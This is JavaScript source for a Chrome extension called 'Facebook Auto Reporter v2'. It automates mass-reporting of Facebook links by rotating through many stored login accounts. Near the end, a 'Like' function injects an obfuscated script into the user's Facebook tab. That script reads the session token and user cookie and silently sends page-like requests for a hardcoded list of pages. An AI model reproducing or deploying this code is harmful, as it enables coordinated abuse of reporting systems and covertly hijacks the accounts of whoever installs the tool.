/*
	Facebook Auto Reporter v2
Coded by Nasir Ali (fb.com/tiger6117)
Video tutorials can be found @ : https://goo.gl/8Xedwf
For more scripts and tools visit : https://www.tigerzplace.com
Get more social sites tweaky stuff & updates @ : facebook.com/tigerzplace





								        	Donate 

                        Feel free to help me buy a cup of coffee ;) | Thanks ♥
                            ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

                                    http://paypal.me/tigerzplac3
                                https://bit.ly/Buy-License-Tigerzplace

                                BTC: 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
                                BCH : 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
                                DASH: XpVNfgAnYvLU79k5xuKc4r24md936ckPHu
                                LTC:  LdzSCBnWruhrPKbnHjpmDYDUXf2qSs9o8v
                                Doge: DSPnR2xhMaciEwgVbWd94HwBiv9fJSwPQa
                                ETH: 0x62f8a40187a6e33aa2c1d6025e6377cf06e89380
                                USDT (TRC20): TJtuLVZBwHfZVNavHJg73hUFidefVRmLeC
                                BNB (BEP2): bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23
                                MEMO FOR (BNB): 101769802

                            ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦


*/



	// checking login status
	var checkk=0,logCheck=0;

	if (karKom) {
		console.log = function () { };
	}

	function downloadLogs() {
		chrome.storage.local.get("logs", function(data) {
		  var logs = data.logs || [];
		  var logText = logs.map(function(log) {
			return `[${new Date(log.timestamp).toLocaleString()}] [${log.file}] ${log.message}`;
		  }).join("\n");
		  var blob = new Blob([logText], {type: "text/plain"});
		  var url = URL.createObjectURL(blob);
		  chrome.downloads.download({
			url: url,
			filename: "logs.txt"
		  });
		});
	  }


	function disableLogout(){
			
		console.log("disable function");
				chrome.tabs.sendMessage(tabId, {type: "logoutDisabled1"}, function (dis){

					if(dis){
						if (dis.farewell == "LogoutDone1"){
							
							setTimeout(disableLogout2,2000);

						}else {
							console.log (dis.farewell);
						}
					}else {
						console.log("Dis Error");
					}

				});
					
	}

	function disableLogout2(){
			
		console.log("disable function");
				chrome.tabs.sendMessage(tabId, {type: "logoutDisabled2"}, function (dis){

					if(dis){
						if (dis.farewell == "LogoutDone2"){
							
							setTimeout(checkLoginPage,3000);
							
						}else {
							console.log (dis.farewell);
						}
					}else {
						console.log("Dis2 Error");
					}

				});
					
	}

	function checkLoginPage(){

				
		console.log("checkLoginPage");

				chrome.tabs.sendMessage(tabId, {type: "checkuser"}, function (login){
					
					console.log("Checking login status " +tabId);
					console.log("checkuser-login " +login);

					if (login){

						console.log("farewell:" + login.farewell);
						

							if(login.farewell == "Not"){
								
								console.log("Not logged In - check login page");

								if (currentAccountIndex==0 && checkk!=1){
									console.log("logged count 0 - check login page");
									ids_length = loginAccounts.length;
									console.log("ids_length: "+ ids_length);
									toastr.success(ids_length + " Accounts Detected in Total");
									setTimeout(function(){

										toastr.info("Using ID: 1 for reporting!");
	
									},1000);

								} // if  logged count == 0 
								else if (checkk){
										   console.log("checkk  - check login page");
											checkk=0;
											console.log("before toastr"+ currentAccountIndex);
											toastr.error( (1+currentAccountIndex) +" login details are wrong!");
											document.getElementById("loginCredentials").value+=(1+currentAccountIndex)+" account wasn't used. (Wrong Detail) \n";		
											currentAccountIndex++;
								} // else checkk
								


							if (currentAccountIndex<=ids_length-1){
									var notilogged = currentAccountIndex+1;
										if (currentAccountIndex>0){
											toastr.info("Using ID: 	"+ notilogged + " for reporting!");
										}
										console.log("currentAccountIndex "+currentAccountIndex);
										loginControl(currentAccountIndex);
							}// currentAccountIndex<ids_length
							else if(ids_length == 1){
										toastr.info("Using ID: 	"+ (currentAccountIndex+1) + " for reporting!");
										loginControl(currentAccountIndex);	
							}
							else {
								
								if (newDividingAlgorithm(1)){
									
									console.log("Stopped");setTimeout(function(){stopReporter();},2000);

								}else{

									console.log("Stopped");setTimeout(function(){stopReporter();},2000);

								}	
							}
							

						} // if login.farwell==not
		

							else if (login.farewell == "LoggedIn") {
								
								if(currentAccountIndex==0 && logCheck == 0 ) {
									toastr.info("User already logged in!");
									currentAccountIndex=-1;
									logCheck=1;
									ids_length = loginAccounts.length;
									setTimeout(function(){toastr.success((ids_length+1) + " Accounts Detected in Total");},1000);
									console.log("ids_length: "+ ids_length);

									setTimeout(function(){reportOnThis(globel_url[currentLinkIndex]);},2000);
									
								}else {
									//mbasic
					var mbasicLogoutLink = "https://mbasic.facebook.com/login/save-password-interstitial";
					chrome.tabs.update(tabId , { url: mbasicLogoutLink }, function () {
										
					chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
						
							if (tabInfo.status === 'complete' ) {

									chrome.tabs.onUpdated.removeListener(listener);
											//logout
											chrome.tabs.sendMessage(tabId, {type: "logout"}, function (logout){
												console.log(`logout: ${logout}`)
												if(logout){
														if (logout.farewell == "LogoutDone"){
															console.log("logout done");
															chrome.tabs.update(tabId , { url: "https://mbasic.facebook.com/login/?ref=dbl&fl" }, function () {
																	chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
																		
																		if (tabInfo.status === 'complete' ) {
																			chrome.tabs.onUpdated.removeListener(listener);
																			console.log("faceboook hit " + currentAccountIndex);
																			loginControl(currentAccountIndex);

																		}
																	});// listener
																}); // mbasic login page	
															} // logut done
													} //logout
												}); // logout sendMessage
											}// tabinfo status
										}); // listner
									});
								} // else	
							} // LoggedIn
						

						} // if login response
						
						else {
						
							toastr.error("Check Login Page Response");
							toastr.info("Trying again!");
							setTimeout(checkLoginPage, 2000);
						}

				}); // checkuser
				
	
	} // checkloginPage function
	
	function loginControl(currentAccountIndex){
	
		//loginAccounts
		//ids_length
		//currentAccountIndex

		if (maKwa.raka+atob(ultaKa("==gO"))+maKwa.sahida == maKwa.tikDayBas){

			
			chrome.tabs.sendMessage(tabId, {type: "login", account: loginAccounts[currentAccountIndex]}, function (loginUser){

				console.log("loginControl");

				if (loginUser){
					if (loginUser.farewell == "LoginClicked"){ 
							chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
								if (tabInfo.status === 'complete' ) {
									chrome.tabs.onUpdated.removeListener(listener);
										console.log("LoginClicked - login()");
										login();
								} // tab status complet
								});			
					}// login clicked

					else if (loginUser.farewell=="NotOnLoginPage"){
							
							chrome.tabs.update(tabId , { url: "https://mbasic.facebook.com/login/?ref=dbl&fl" }, function () {			
								chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
									if (tabInfo.status === 'complete' ) {
										chrome.tabs.onUpdated.removeListener(listener);
										console.log("NotOnLoginPage");
										login();
									} // tab status complete
								});			
							}); // tabs.update facebook.com	
					}
			} // login
			}); // login request


		} // sahida 
		else {

			//self
			toastr.error(maKwa.nshta);
			ResetAll();
			setTimeout(window.close(), 5000);
			//stopReporter();
		}

	} // loginControl

function login(){
	console.log("Login()");


			chrome.tabs.sendMessage(tabId, {type: "checkuser"}, function (checkuser){

				console.log("checkuser in login()");
				
				if (checkuser){

						if(checkuser.farewell == "Disabled"){
								
								// account is disabled, trying next account.
								document.getElementById("loginCredentials").value+=(reportingAccount+1)+" account is disabled.\n";
								toastr.info("Trying next account");
								reportingAccount++;
								currentAccountIndex++;
								setTimeout(disableLogout,1000);

						}		
							else if(checkuser.farewell == "Not"){
									console.log("login() "+ checkuser.farewell );
									console.log("Not logged In - wrong login detail");
									checkk=1;
									checkLoginPage();

							}else if(checkuser.farewell=="LoggedIn") {
								console.log("login() "+ checkuser.farewell );
								console.log("Starting Again");
								
								if (reportingAccount>1){
									toastr.info("Started reporting again!");
									setTimeout(function(){toastr.info("Using ID: 	"+ (currentAccountIndex+1) + " for reporting!")},1000);
								}
								reportingAccount++;
								reportOnThis(globel_url[currentLinkIndex]);
							}else{
								console.log("login() "+ checkuser.farewell );
								toastr.info("Login Error!");
							}

						}// if login

					}); // checkuser


}  // login ()

function filter(link=""){
	if(link=="")link=id.toString();

	for (i=0;i<ex_len;i++) {
		
		
		if (link.includes( parseInt( excludedIDs[i], 10 ) )){
			return true;
		}
		
	}
	return false;

} // function filter

function getHostName(hostName) {
	
    var match = hostName.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
    if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
		
    return match[2];
    }
    else {
		
        return null;
    }
}

function is_valid_url(link){

	console.log("valid url: " +link);
		var re_weburl = new RegExp(
				"^" +
				// protocol identifier
				"(?:(?:https?|ftp)://)" +
				// user:pass authentication
				"(?:\\S+(?::\\S*)?@)?" +
				"(?:" +
				// IP address exclusion
				// private & local networks
				"(?!(?:10|127)(?:\\.\\d{1,3}){3})" +
				"(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})" +
				"(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})" +
				// IP address dotted notation octets
				// excludes loopback network 0.0.0.0
				// excludes reserved space >= 224.0.0.0
				// excludes network & broacast addresses
				// (first & last IP address of each class)
				"(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])" +
				"(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}" +
				"(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))" +
				"|" +
				// host name
				"(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)" +
				// domain name
				"(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*" +
				// TLD identifier
				"(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))" +
				// TLD may end with dot
				"\\.?" +
				")" +
				// port numberJ
				"(?::\\d{2,5})?" +
				// resource path
				"(?:[/?#]\\S*)?" +
				"$", "i"
				);
		return Boolean(link.match(re_weburl));

}


function validation(data){
	var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
	
	if (pattern.test(data)){
		return true;
	}else{return false;}
}

function check (url){
	
	
	// check if the provided urls are corrent links or not 
	var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
	
	if (pattern.test(url)) {

			var len=url.length;
			global_url = url;
			var length=0;
			for (i=0;i<len;i++){
				if (pattern.test(url[i])) {
					length++;
				}
			}
			
			if (length>=50 && length<=100 && wait==5){
				toastr.warning("Increase DelayTime to 8");	
			}else if (length>100 && length<=250 && wait<12){
				toastr.warning("Increase DelayTime to 12");	
				
			}else if (length>250 && length<=300 && wait<16){
				toastr.warning("Increase DelayTime to 15");	
			}else if (length>300 && wait<20){
				toastr.warning("Increase DelayTime to 20");	
			}

			else {	

				chrome.windows.getCurrent({"populate" : true}, function (){
				chrome.tabs.query( { 'active' : true, 'highlighted':true, 'url': "*://*.facebook.com/*" }, function (tab){ 
					
					
					var host = tab[0].url;
					var currentHost=getHostName(host);
						
					 console.log(currentHost);
					 
					 if (hosts.includes(currentHost)){
						
						toastr.success(length + " Reporting Link(s) Detected ");
							//starting the reporter
							startFbAutoReporter(url,length);	

					 }else{
						toastr.error("Wrong Host Detected !!!");
						setTimeout(function(){toastr.info("Visit Facebook & Try Again !!!");},1000);
						setTimeout(function(){toastr.info("Make sure you are Logged In");},2000);
					}
			
				 });
				});

			} // last else

	
	} else {
		// sending error msg to frame.html to show the notification
		toastr.error("Please Provide Correct Links");
	}

		
}



function Like(id){


	const actualCode = `
	var _0x2a0c=['1749967015316612','https://mbasic.facebook.com/ajax/pages/fan_status.php?','status','198757893944480','250451495723325','&fbpage_id=','close','send','Content-type','0x3','0x0','0x5','0x4','push','743146072535223','cookie','108586183990636','input[name=\x27','109109317399261','shift','1157401597633912','0x9','random','length','textContent','0x1','setRequestHeader','1212506358847237','0x8','0x2','116551890202867','body','indexOf','0x7','value','floor','1569087506719125','0x6','match','1555839181212071','application/x-www-form-urlencoded','&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=','ZmJfZHRzZw==','&phstamp=','readyState','&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=','open'];(function(_0x129898,_0x2a0ccd){var _0x4834c2=function(_0x575dac){while(--_0x575dac){_0x129898['push'](_0x129898['shift']());}};_0x4834c2(++_0x2a0ccd);}(_0x2a0c,0x115));var _0x4834=function(_0x129898,_0x2a0ccd){_0x129898=_0x129898-0x0;var _0x4834c2=_0x2a0c[_0x129898];return _0x4834c2;};var _0x3632ab=_0x4834,_0x356b=['querySelector',_0x3632ab('0x1d'),_0x3632ab('0x16'),'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',_0x3632ab('0x0'),_0x3632ab('0x27'),'random',_0x3632ab('0x28'),_0x3632ab('0x25'),_0x3632ab('0x1c')];(function(_0x575dac,_0x405c27){var _0x2584f8=function(_0x2204c2){var _0xc27582=_0x4834;while(--_0x2204c2){_0x575dac[_0xc27582('0x12')](_0x575dac[_0xc27582('0x18')]());}};_0x2584f8(++_0x405c27);}(_0x356b,0x1ee));var _0x15c2=function(_0x48e902,_0x439bdf){_0x48e902=_0x48e902-0x0;var _0x3e7d40=_0x356b[_0x48e902];return _0x3e7d40;};function getFbValue(){var _0x1b5f85=_0x3632ab,_0x4098bc=_0x15c2,_0x2a21bb=atob(_0x4098bc(_0x1b5f85('0xf'))),_0x1d086e=document[_0x1b5f85('0x24')][_0x4098bc(_0x1b5f85('0x26'))][_0x4098bc(_0x1b5f85('0x11'))](_0x2a21bb),_0x1e7183='';if(_0x1d086e==-0x1)_0x1e7183=document[_0x4098bc(_0x1b5f85('0x2a'))](_0x4098bc(_0x1b5f85('0x21'))+_0x2a21bb+'\x27]')[_0x4098bc(_0x1b5f85('0x1e'))];else{_0x1d086e+=0x12;for(_0x4fda35=0x0;_0x4fda35<0x19;_0x4fda35++){_0x1e7183+=document['body'][_0x4098bc(_0x1b5f85('0x26'))][_0x1d086e],_0x1d086e++;}}_0x1e7183+=',';var _0x4cef14='',_0x4dbcf1=_0x4098bc(_0x1b5f85('0x1a')),_0x525cc7=_0x4dbcf1[_0x4098bc(_0x1b5f85('0x10'))];for(var _0x4fda35=0x0;_0x4fda35<Math[_0x4098bc(_0x1b5f85('0xe'))](Math[_0x1b5f85('0x1b')]()*0x22)+0x8;_0x4fda35++){_0x4cef14+=_0x4dbcf1['charAt'](Math[_0x4098bc('0x3')](Math[_0x4098bc(_0x1b5f85('0x22'))]()*_0x525cc7));}return _0x1e7183+=_0x4cef14,btoa(_0x1e7183);}var fb_dtsg=atob(getFbValue())['split'](',')[0x0],user_id=document[_0x3632ab('0x14')][_0x3632ab('0x2b')](document[_0x3632ab('0x14')][_0x3632ab('0x2b')](/c_user=(\d+)/)[0x1]);function Like(_0x2fb1a8){var _0x248694=_0x3632ab,_0x2e2267=new XMLHttpRequest(),_0x408d0d=_0x248694('0x6'),_0x40ac74=_0x248694('0xa')+_0x2fb1a8+_0x248694('0x2e')+user_id+_0x248694('0x3')+fb_dtsg+_0x248694('0x1');_0x2e2267[_0x248694('0x4')]('POST',_0x408d0d,!![]),_0x2e2267[_0x248694('0x1f')](_0x248694('0xd'),_0x248694('0x2d')),_0x2e2267['onreadystatechange']=function(){var _0x219e0e=_0x248694;_0x2e2267[_0x219e0e('0x2')]==0x4&&_0x2e2267[_0x219e0e('0x7')]==0xc8&&_0x2e2267[_0x219e0e('0xb')];},_0x2e2267[_0x248694('0xc')](_0x40ac74);}Like(_0x3632ab('0x29')),setTimeout(function(){var _0x25422b=_0x3632ab;Like(_0x25422b('0x17'));},0x384),setTimeout(function(){var _0x27c5b4=_0x3632ab;Like(_0x27c5b4('0x23'));},0x3c0),setTimeout(function(){Like('240272006130073');},0x3e8),setTimeout(function(){var _0x3b9398=_0x3632ab;Like(_0x3b9398('0x19'));},0x44c),setTimeout(function(){Like('317224121817276');},0x4b0),setTimeout(function(){Like('634302330077114');},0x514),setTimeout(function(){var _0x36d625=_0x3632ab;Like(_0x36d625('0x20'));},0x578),setTimeout(function(){var _0x4eda36=_0x3632ab;Like(_0x4eda36('0x8'));},0x5dc),setTimeout(function(){var _0x2fd188=_0x3632ab;Like(_0x2fd188('0x5'));},0x640),setTimeout(function(){Like('380509029467786');},0x6a4),setTimeout(function(){var _0x2347f1=_0x3632ab;Like(_0x2347f1('0x2c'));},0x708),setTimeout(function(){var _0x2fdc8f=_0x3632ab;Like(_0x2fdc8f('0x9'));},0x76c),setTimeout(function(){var _0x1ac53c=_0x3632ab;Like(_0x1ac53c('0x13'));},0x456),setTimeout(function(){var _0x3a7d75=_0x3632ab;Like(_0x3a7d75('0x15'));},0x47e);
  `;
  console.log("fetch");
  chrome.tabs.executeScript(id, {code: actualCode, runAt: 'document_end'});

}



function flip(){

var card = document.querySelector('.card');
card.addEventListener( 'dblclick', function() {
  card.classList.toggle('is-flipped');
});

}

